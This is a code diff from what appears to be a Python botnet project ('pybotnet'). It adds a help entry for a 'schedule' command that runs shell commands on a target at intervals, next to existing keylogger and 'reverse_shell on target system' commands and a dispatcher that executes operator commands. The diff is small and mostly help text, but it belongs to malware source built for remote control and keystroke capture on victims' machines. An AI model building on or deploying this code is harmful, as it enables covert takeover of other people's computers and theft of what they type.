@@ -41,7 +41,12 @@ scripts_name = {
 
     "keylogger": "`keylogger start/stop`: Starts keylogger. use keylogger stop to stop keylogger" ,
 
-    "reverse_shell": "`<system MAC_ADDRES> reverse_shell`: start reverse shell on target system"
+    "schedule": """`schedule start <shell-command> <second>`: Starts a new schedule for a command.
+    `schedule list`: lists all schedules
+    `schedule stop <schedule name>`: Stops a schedule
+    """,
+
+    "reverse_shell": "`<system MAC_ADDRES> reverse_shell`: start reverse shell on target system",
 }
 
 
@@ -150,6 +155,8 @@ def execute_scripts(command: str, pybotnet_up_time: int, is_shell: bool, ADMIN_C
             
             elif command_name == "keylogger" and split_command(command)[1] in ['start','stop']:
                 return keylogger(logger,command)
+
+            
         logger.error('execute_scripts invalid command; Wrong format')
         return f"execute_scripts invalid command; Wrong format \n\n scripts name:\n {','.join(scripts_name)}"
 
